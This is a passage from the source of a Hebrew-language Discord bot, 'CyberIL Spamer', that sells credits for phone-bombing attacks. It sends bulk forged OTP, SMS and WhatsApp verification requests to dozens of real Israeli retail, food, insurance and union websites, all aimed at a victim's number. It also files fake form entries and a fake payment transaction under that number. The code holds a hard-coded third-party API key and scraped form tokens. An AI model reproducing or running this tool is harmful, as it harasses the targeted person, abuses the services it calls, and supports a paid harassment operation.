            _async_req(s,"POST","https://rest-api.dibs-app.com/otps",json_body={"phoneNumber":phone_972},extra_headers=jh("https://dibs-app.com","https://dibs-app.com/",{"sec-fetch-site":"same-site"}),label="dibs"),
            _async_req(s,"POST","https://www.nine-west.co.il/customer/ajax/post/",data=f"bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.nine-west.co.il","https://www.nine-west.co.il/"),label="nine-west"),
            _async_req(s,"POST","https://www.leecooper.co.il/customer/ajax/post/",data=f"bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.leecooper.co.il","https://www.leecooper.co.il/"),label="leecooper"),
            _async_req(s,"POST","https://www.kikocosmetics.co.il/customer/ajax/post/",data=f"bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.kikocosmetics.co.il","https://www.kikocosmetics.co.il/"),label="kikocosmetics"),
            _async_req(s,"POST","https://www.topten-fashion.com/customer/ajax/post/",data=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.topten-fashion.com","https://www.topten-fashion.com/"),label="topten-fashion"),
            _async_req(s,"POST","https://www.hoodies.co.il/customer/ajax/post/",data=f"form_key=kxMwRR4nj3lOH7Aq&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.hoodies.co.il","https://www.hoodies.co.il/"),label="hoodies"),
            _async_req(s,"POST","https://www.lehamim.co.il/_a/aff_otp_auth",data=f"phone={p}",extra_headers={**fh("https://www.lehamim.co.il","https://www.lehamim.co.il/"),"sec-fetch-site":"same-origin"},label="lehamim"),
            _async_req(s,"POST","https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",json_body={"password":None,"phoneNr":p,"sendType":1,"systemType":None},extra_headers=jh("https://www.555.co.il","https://www.555.co.il/",{"sec-fetch-site":"same-origin"}),label="555"),
            _async_req(s,"POST","https://www.jungle-club.co.il/wp-admin/admin-ajax.php",data=f"action=simply-check-member-cellphone&cellphone={p}",extra_headers=fh("https://www.jungle-club.co.il","https://www.jungle-club.co.il/"),label="jungle-club"),
            _async_req(s,"POST","https://blendo.co.il/wp-admin/admin-ajax.php",data=f"action=simply-check-member-cellphone&cellphone={p}",extra_headers=fh("https://blendo.co.il","https://blendo.co.il/"),label="blendo"),
            _async_req(s,"POST","https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",json_body={"phoneNumber":p,"sourceFrom":"AuthJS","isCalling":True},extra_headers=jh("https://mishloha.co.il","https://mishloha.co.il/",{"sec-fetch-site":"same-site"}),label="mishloha"),
            _async_req(s,"POST","https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",json_body={"type":"otp","data":{"phone":p}},label="webcut"),
            _async_req(s,"POST","https://middleware.freetv.tv/api/v1/send-verification-sms",json_body={"msisdn":p},extra_headers=jh("https://freetv.tv","https://freetv.tv/"),label="freetv"),
            _async_req(s,"POST","https://we.care.co.il/wp-admin/admin-ajax.php",data=(f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL Spamer&form_fields[phone]={p}&form_fields[email]={rand_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"),extra_headers=fh("https://we.care.co.il","https://we.care.co.il/glasses-tor/"),label="we.care"),
            _async_req(s,"POST","https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",data=f"MosadId=7000297&ClientName=CyberIL Spamer&Phone={p}&Amount=100&Tashlumim=1",extra_headers={"Content-Type":FORM,"accept-encoding":"gzip, deflate","referer":"https://www.matara.pro/","origin":"https://www.matara.pro"},label="matara"),
            _async_req(s,"POST","https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",data=(f"action=otp_register&otp_phone={p}&first_name=Cyber&last_name=IL&email={rand_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"),extra_headers=fh("https://wissotzky-tlab.co.il","https://wissotzky-tlab.co.il/%D7%9E%D7%95%D7%A2%D7%93%D7%95%D7%9F-t-club/?"),label="wissotzky"),
            _async_req(s,"POST","https://clocklb.ok2go.co.il/api/v2/users/login",json_body={"phone":p},extra_headers=jh("https://clocklb.ok2go.co.il","https://clocklb.ok2go.co.il/",{"sec-fetch-site":"same-origin"}),label="ok2go"),
            _async_req(s,"POST","https://api-endpoints.histadrut.org.il/signup/send_code",json_body={"phone":p},extra_headers={"Content-Type":"application/json","accept-encoding":"gzip, deflate","origin":"https://signup.histadrut.org.il","referer":"https://signup.histadrut.org.il/","x-api-key":"480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189","sec-fetch-site":"same-site"},label="histadrut"),
            _async_req(s,"POST","https://www.papajohns.co.il/_a/aff_otp_auth",data=f"phone={p}",extra_headers={**fh("https://www.papajohns.co.il","https://www.papajohns.co.il/"),"sec-fetch-site":"same-origin"},label="papajohns"),
            _async_req(s,"POST","https://www.iburgerim.co.il/_a/aff_otp_auth",data=f"phone={p}",extra_headers={**fh("https://www.iburgerim.co.il","https://www.iburgerim.co.il/"),"sec-fetch-site":"same-origin"},label="iburgerim"),
            _async_req(s,"GET",f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={p}",extra_headers={"referer":"https://www.americanlaser.co.il/calc/","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","accept-encoding":"gzip, deflate"},label="americanlaser"),
            _async_req(s,"POST",f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={p}",json_body={"id":uid,"domain":"5fc39fabffae5ac5a229cebb","action":"generateOneTimer","phoneNumber":p},extra_headers=jh("https://orders.beecommcloud.com","https://orders.beecommcloud.com/",{"sec-fetch-site":"cross-site"}),label="beecomm"),
            _async_req(s,"POST","https://xtra.co.il/apps/api/inforu/sms",json_body={"phoneNumber":p},extra_headers={"Content-Type":"application/json","accept-encoding":"gzip, deflate","origin":"https://xtra.co.il","referer":"https://xtra.co.il/pages/brand/cafe-cafe","sec-fetch-site":"same-origin"},label="xtra"),
            _async_req(s,"POST","https://www.lighting.co.il/customer/ajax/post/",data=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.lighting.co.il","https://www.lighting.co.il/"),label="lighting"),
            _async_req(s,"POST","https://proxy1.citycar.co.il/api/verify/login",json_body={"phoneNumber":phone_972,"verifyChannel":2,"loginOrRegister":1},extra_headers=jh("https://citycar.co.il","https://citycar.co.il/",{"sec-fetch-site":"same-site"}),label="citycar"),
            _async_req(s,"POST","https://www.lilit.co.il/customer/ajax/post/",data=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.lilit.co.il","https://www.lilit.co.il/"),label="lilit"),
            _async_req(s,"POST","https://www.urbanica-wh.com/customer/ajax/post/",data=f"bot_validation=1&type=login&telephone={p}",extra_headers=fh("https://www.urbanica-wh.com","https://www.urbanica-wh.com/"),label="urbanica"),
            _async_req(s,"POST","https://www.castro.com/customer/ajax/post/",data=f"bot_validation=1&type=login&telephone={p}",extra_headers=fh("https://www.castro.com","https://www.castro.com/"),label="castro"),
            _async_req(s,"POST","https://www.bathandbodyworks.co.il/customer/ajax/post/",data=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.bathandbodyworks.co.il","https://www.bathandbodyworks.co.il/home"),label="bathandbodyworks"),
            _async_req(s,"POST","https://www.golbary.co.il/customer/ajax/post/",data=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.golbary.co.il","https://www.golbary.co.il/"),label="golbary"),
            _async_req(s,"POST","https://api.getpackage.com/v1/graphql/",json_body={"operationName":"sendCheckoutRegistrationCode","variables":{"userName":p},"query":"mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},extra_headers=jh("https://www.getpackage.com","https://www.getpackage.com/",{"sec-fetch-site":"same-site"}),label="getpackage"),
            _async_req(s,"POST","https://ohmama.co.il/?wc-ajax=validate_user_by_sms",data=f"otp_login_nonce=de90e8f67b&phone={p}&security=de90e8f67b",extra_headers={**fh("https://ohmama.co.il","https://ohmama.co.il/"),"sec-fetch-site":"same-origin"},label="ohmama"),
            _async_req(s,"POST","https://server.myofer.co.il/api/sendAuthSms",json_body={"phoneNumber":p},extra_headers=jh("https://www.myofer.co.il","https://www.myofer.co.il/",{"sec-fetch-site":"same-site","x-app-version":"3.0.0"}),label="myofer"),
            _async_req(s,"POST","https://arcaffe.co.il/wp-admin/admin-ajax.php",data=f"action=user_login_step_1&phone_number={p}&step[]=1",extra_headers=fh("https://arcaffe.co.il","https://arcaffe.co.il/"),label="arcaffe"),
            _async_req(s,"POST","https://api.noyhasade.co.il/api/login?origin=web",json_body={"phone":p,"email":False,"ip":"1.1.1.1"},extra_headers=jh("https://www.noyhasade.co.il","https://www.noyhasade.co.il/",{"sec-fetch-site":"same-site"}),label="noyhasade"),
            _async_req(s,"POST","https://api.geteat.co.il/auth/sendValidationCode",data=geteat_fd,extra_headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36","accept-encoding":"gzip, deflate","origin":"https://order.geteat.co.il","referer":"https://order.geteat.co.il/","sec-fetch-mode":"cors","sec-fetch-site":"same-site"},label="geteat"),
        ] + atmos_club_tasks

        results = await asyncio.gather(*tasks, return_exceptions=True)
        success, failed = 0, []
        for r in results:
            if isinstance(r, Exception):
                pass 
            elif isinstance(r, tuple):
                if len(r) == 3:
                    ok, lbl, reason = r
                    if ok: success += 1
                    else:  failed.append(f"{lbl} ({reason})")
                else:
                    ok, lbl = r
                    if ok: success += 1
                    else:  failed.append(lbl)
                    
        for r in atmos_results:
            if isinstance(r, Exception):
                pass
            elif isinstance(r, tuple):
                if len(r) == 3:
                    ok, lbl, reason = r
                    if ok: success += 1
                    else:  failed.append(f"{lbl} ({reason})")
                else:
                    ok, lbl = r
                    if ok: success += 1
                    else:  failed.append(lbl)
                    
        return success, failed

# ─── לוח בקרה ──────────────────────────────────────────────────────────────

def panel_embed() -> discord.Embed:
    embed = discord.Embed(
        title="⚡ CyberIL Operations | לוח בקרה",
        color=0x2b2d31,  # צבע כהה יוקרתי (מתמזג עם הדיסקורד)
        description=(
            f"ברוך הבא למרכז השליטה.\n"
            f"למדריך והסברים מפורטים: <#{INFO_CHANNEL}>\n"
            "──────────────────────────"
        )
    )
    
    embed.add_field(
        name="🚀 שיגור מתקפה", 
        value="`SMS` • `Calls` • `WhatsApp`\n*(צריכת קרדיטים בהתאם לשימוש)*", 
        inline=False
    )
    
    embed.add_field(
        name="📊 היתרה שלי", 
        value="לחץ לבדיקת קרדיטים", 
        inline=True
    )
    
    embed.add_field(
        name="💳 טעינת חשבון", 
        value=f"[לרכישה באתר הישיר]({WEBSITE_URL})", 
        inline=True
    )
    
    embed.set_footer(text="CyberIL System • Secure Connection • 2026", icon_url=bot.user.avatar.url if bot.user.avatar else None)
    
    return embed

# ─── תצוגות ────────────────────────────────────────────────────────────────────

class StopView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=600)
        self.user_id = user_id

    @discord.ui.button(label="🛑 עצור ספאם", style=discord.ButtonStyle.danger)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id and not is_admin(interaction):
            await interaction.response.send_message("❌ לא ההתקפה שלך.", ephemeral=True)
            return
        ev = active_attacks.get(self.user_id)
        if ev: ev.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmView(discord.ui.View):
    def __init__(self, phone: str, rounds: int, credits_cost: int, user_id: int):
        super().__init__(timeout=30)
        self.phone = phone
        self.rounds = rounds
        self.credits_cost = credits_cost
        self.user_id = user_id

    @discord.ui.button(label="✅ כן, התחל", style=discord.ButtonStyle.danger)
    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך.", ephemeral=True)
            return
        self.stop()

        try:
            await interaction.response.defer()
        except Exception:
            return

        for _ in range(self.credits_cost):
            if not await deduct_credits(self.user_id):
                await interaction.edit_original_response(
                    embed=discord.Embed(title="❌ אין מספיק קרדיטים.", color=DARK_RED), view=None)
                return

        stop_event = asyncio.Event()
        active_attacks[self.user_id] = stop_event

        embed = discord.Embed(
            title="🚀 ספאם בפעולה",
            description=f"מתקיף את **{self.phone}** — ~{self.credits_cost * 35} שניות",
            color=RED
        )
        embed.set_footer(text="לחץ על עצור כדי לבטל.")
        await interaction.edit_original_response(embed=embed, view=StopView(self.user_id))

        try:
            for _ in range(self.rounds):
                if stop_event.is_set(): break
                await fire_all_senders(self.phone)

            await set_cooldown(self.phone)
            active_attacks.pop(self.user_id, None)
            stopped = stop_event.is_set()

            bal_str = await get_balance_display(self.user_id)
            final = discord.Embed(
                title="🛑 נעצר" if stopped else "✅ התקפה הושלמה",
                color=DARK_RED
            )
            final.add_field(name="📱 יעד", value=self.phone, inline=True)
            final.add_field(name="⏱️ משך", value=f"~{self.credits_cost * 35} שניות", inline=True)
            final.add_field(name="💰 קרדיטים נותרים", value=bal_str, inline=True)
            
            await interaction.edit_original_response(embed=final, view=None)

        except Exception as e:
            active_attacks.pop(self.user_id, None)
            await interaction.edit_original_response(
                embed=discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=DARK_RED),
                view=None
            )

    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary)
    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך.", ephemeral=True)
            return
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים.", color=DARK_RED),
            view=None)

class LaunchModal(discord.ui.Modal, title="🚀 התחל ספאם"):
    phone_input = discord.ui.TextInput(
        label="מספר טלפון",
        placeholder="054XXXXXXX",
        min_length=10, max_length=10,
        style=discord.TextStyle.short
    )
    credits_input = discord.ui.TextInput(
        label="קרדיטים לשימוש (מקסימום 100)",
        placeholder="למשל 5",
        min_length=1, max_length=3,
        style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone_input.value.strip()
        if not re.match(r"^05[0-9]{8}$", phone):
            await interaction.response.send_message("❌ מספר לא חוקי — חייב להיות **05XXXXXXXX**", ephemeral=True)
            return

        try:
            credits_to_use = int(self.credits_input.value.strip())
            if credits_to_use < 1 or credits_to_use > MAX_CREDITS:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(f"❌ חייב להיות 1–{MAX_CREDITS}.", ephemeral=True)
            return

        uid = interaction.user.id
        total_rounds = credits_to_use * ROUNDS_PER_CREDIT
        
        bal = await get_credits(uid)
        has_lt = await has_lifetime(uid)

        if bal < credits_to_use and not has_lt:
            await interaction.response.send_message(
                f"❌ צריך **{credits_to_use}** קרדיטים | יש לך **{bal}**", ephemeral=True)
            return

        on_cd, remain = await is_on_cooldown(phone)
        if on_cd:
            await interaction.response.send_message(
                f"⏳ מספר בקואלדאון — **{remain} שניות** נותרו.", ephemeral=True)
            return

        bal_str = await get_balance_display(uid)
        embed = discord.Embed(
            title="⚠️ אשר ספאם",
            description=(
                f"```\n"
                f"יעד     : {phone}\n"
                f"משך     : ~{credits_to_use * 35} שניות\n"
                f"עלות    : {credits_to_use} קרדיטים  |  יתרה: {bal_str}\n"
                f"```"
            ),
            color=ORANGE_RED
        )
        await interaction.response.send_message(
            embed=embed,
            view=ConfirmView(phone=phone, rounds=total_rounds,
                             credits_cost=credits_to_use, user_id=interaction.user.id),
            ephemeral=True
        )

class ControlPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(
            label="💳 רכישת קרדיטים",
            style=discord.ButtonStyle.link,
            url=BUY_URL
        ))

    @discord.ui.button(label="💣 ספאם לטלפון", style=discord.ButtonStyle.danger, custom_id="cp_launch")
    async def launch_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = time.time()
        last = _launch_cooldowns.get(interaction.user.id, 0)
        if now - last < LAUNCH_COOLDOWN:
            rem = int(LAUNCH_COOLDOWN - (now - last))
            try:
                await interaction.response.send_message(f"⏳ קואלדאון — **{rem} שניות** נותרו.", ephemeral=True)
            except discord.errors.NotFound:
                pass
            return
        _launch_cooldowns[interaction.user.id] = now
        try:
            await interaction.response.send_modal(LaunchModal())
        except discord.errors.NotFound:
            pass

    @discord.ui.button(label="💰 הקרדיטים שלי", style=discord.ButtonStyle.primary, custom_id="cp_balance")
    async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        bal_str = await get_balance_display(uid)
        embed = discord.Embed(
            title="💰 היתרה שלך",
            description=f"**{bal_str}** קרדיטים",
            color=RED
        )
        try:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.errors.NotFound:
            pass

# ─── תצוגת קרדיטים חינמיים ────────────────────────────────────────────────────────

class FreeCreditsView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל 5 קרדיטים", style=discord.ButtonStyle.danger, custom_id="free_credits_claim")
    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        try:
            await interaction.response.defer(ephemeral=True)
        except Exception:
            return
        doc = await settings_col.find_one({"_id": uid, "type": "free_credits"})
        if doc:
            diff = now - doc.get("last_claim", 0)
            if diff < 86400:
                rh = int((86400 - diff) // 3600)
                rm = int(((86400 - diff) % 3600) // 60)
                embed = discord.Embed(
                    title="⏳ כבר מימשת היום",
                    description=f"חזור בעוד **{rh} שעות {rm} דקות**",
                    color=DARK_RED
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
        await add_credits(uid, 5)
        await settings_col.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
        
        bal_str = await get_balance_display(uid)
        embed = discord.Embed(
            title="🎁 +5 קרדיטים!",
            description=f"יתרה חדשה: **{bal_str}** קרדיטים\nחזור מחר!",
            color=RED
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

# ─── אירוע התחברות ─────────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    bot.add_view(ControlPanelView())
    bot.add_view(FreeCreditsView())
    await tree.sync()
    print(f"✅ CyberIL Spamer התחבר → {bot.user}")

    await asyncio.sleep(2)
    
    try:
        bomb_ch = bot.get_channel(BOMB_AUTO_CHANNEL)
        if bomb_ch:
            await bomb_ch.purge(limit=5)
            await bomb_ch.send(embed=panel_embed(), view=ControlPanelView())
        else:
            print(f"❌ לא נמצא ערוץ עם ID: {BOMB_AUTO_CHANNEL}")

        free_ch = bot.get_channel(FREE_CREDITS_CHANNEL)
        if free_ch:
            embed = discord.Embed(
                title="🎁 מתנה חינם!",
                description=(
                    "כל אחד יכול לקבל **5 קרדיטים חינם** לשימוש בספאמר!\n\n"
                    "ניתן לממש פעם אחת כל **24 שעות**."
                ),
                color=0x000000
            )
            await free_ch.purge(limit=5)
            await free_ch.send(embed=embed, view=FreeCreditsView())
        else:
            print(f"❌ לא נמצא ערוץ עם ID: {FREE_CREDITS_CHANNEL}")
            
    except Exception as e:
        print(f"שגיאה בהתחברות: {e}")

# ─── פקודות סלאש ───────────────────────────────────────────────────────────

@tree.command(name="checkmycredit", description="בדוק את היתרה הנוכחית שלך")
@app_commands.describe(member="משתמש לבדיקה (השאר ריק לעצמך)")
async def slash_credits(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    bal_str = await get_balance_display(target.id)
    embed = discord.Embed(
        title="💰 קרדיטים",
        description=f"{target.mention} — **{bal_str}** קרדיטים",
        color=RED
    )
    await interaction.response.send_message(embed=embed)

@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים למשתמש")
@app_commands.describe(member="משתמש יעד", amount="כמות להוספה")
async def slash_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ חייב להיות חיובי.", ephemeral=True)
        return
    await add_credits(member.id, amount)
    new_bal_str = await get_balance_display(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=RED)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal_str, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים ממשתמש")
@app_commands.describe(member="משתמש יעד", amount="כמות להסרה")
async def slash_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ חייב להיות חיובי.", ephemeral=True)
        return
    await remove_credits(member.id, amount)
    new_bal_str = await get_balance_display(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=DARK_RED)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal_str, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[ADMIN] הענק קרדיטים ללא הגבלה למשתמש")
@app_commands.describe(member="משתמש יעד")
async def slash_add_lifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer()
    await set_lifetime(member.id, True)
    embed = discord.Embed(
        title="♾️ הוענק ללא הגבלה",
        description=f"{member.mention} קיבל **קרדיטים ללא הגבלה**.",
        color=RED
    )
    await interaction.followup.send(embed=embed)

@tree.command(name="removelifetime", description="[ADMIN] הסר קרדיטים ללא הגבלה ממשתמש")
@app_commands.describe(member="משתמש יעד")
async def slash_removelifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer()
    await set_lifetime(member.id, False)
    embed = discord.Embed(
        title="♾️ הוסר ללא הגבלה",
        description=f"{member.mention} כבר לא בעל קרדיטים ללא הגבלה.",
        color=DARK_RED
    )
    await interaction.followup.send(embed=embed)

@tree.command(name="freecredits", description="[ADMIN] פרסם את הודעת הקרדיטים החינמיים")
async def slash_freecredits(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    embed = discord.Embed(
        title="🎁 מתנה חינם!",
        description=(
            "כל אחד יכול לקבל **5 קרדיטים חינם** לשימוש בספאמר!\n\n"
            "ניתן לממש פעם אחת כל **24 שעות**."
        ),
        color=0x000000
    )
    await interaction.response.send_message(embed=embed, view=FreeCreditsView())

@tree.command(name="giveall", description="[ADMIN] תן קרדיטים לכולם")
@app_commands.describe(amount="כמות לתת לכולם")
async def slash_giveall(interaction: discord.Interaction, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ חייב להיות חיובי.", ephemeral=True)
        return
    await credits_col.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ נתת **{amount}** קרדיטים לכולם!", ephemeral=True)

@tree.command(name="checkcredit", description="[ADMIN] בדוק יתרה של משתמש ספציפי")
@app_commands.describe(member="משתמש לבדיקה")
async def slash_checkcredit(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    status = await get_balance_display(member.id)
    embed = discord.Embed(title="💳 מידע ארנק (תצוגת אדמין)", color=0x2b2d31)
    embed.add_field(name="משתמש:", value=member.mention, inline=True)
    embed.add_field(name="יתרה נוכחית:", value=f"**{status}**", inline=True)
    embed.set_footer(text=f"נבדק על ידי {interaction.user.name}")
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="transfercredit", description="העבר קרדיטים למשתמש אחר (מינימום 20)")
@app_commands.describe(member="מקבל", amount="כמות להעברה (מינימום 20)")
async def slash_transfercredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה הוא **20** קרדיטים.", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך.", ephemeral=True)
        return
    uid = interaction.user.id
    has_lt = await has_lifetime(uid)
    if has_lt:
        await interaction.followup.send("❌ משתמשים ללא הגבלה לא יכולים להעביר קרדיטים.", ephemeral=True)
        return
    bal = await get_credits(uid)
    if bal < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים. יש לך **{bal}**.", ephemeral=True)
        return
    await remove_credits(uid, amount)
    await add_credits(member.id, amount)
    embed = discord.Embed(title="💸 העברה הושלמה", color=0x000000)
    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
    embed.add_field(name="אל", value=member.mention, inline=True)
    embed.add_field(name="כמות", value=f"**{amount}** קרדיטים", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="restart", description="[ADMIN] הפעל מחדש את הבוט")
async def slash_restart(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מפעיל מחדש...", ephemeral=True)
    await bot.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

@tree.command(name="checkstatus", description="[ADMIN] בדוק כמה APIs עובדים")
async def slash_checkstatus(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    test_phone = "0506500708"
    
    success, failed = await fire_all_senders(test_phone)
    total = success + len(failed)
    
    embed = discord.Embed(title="📊 בדיקת סטטוס API", color=RED)
    embed.add_field(name="✅ עובדים", value=str(success), inline=True)
    embed.add_field(name="❌ נכשלו", value=str(len(failed)), inline=True)
    embed.add_field(name="🔢 סה\"כ נבדקו", value=str(total), inline=True)
    
    if failed:
        failed_str = ", ".join(failed)
        if len(failed_str) > 1024:
            failed_str = failed_str[:1020] + "..."
        embed.add_field(name="API שנכשלו:", value=failed_str, inline=False)

    await interaction.followup.send(embed=embed, ephemeral=True)

if __name__ == "__main__":
    bot.run(TOKEN)
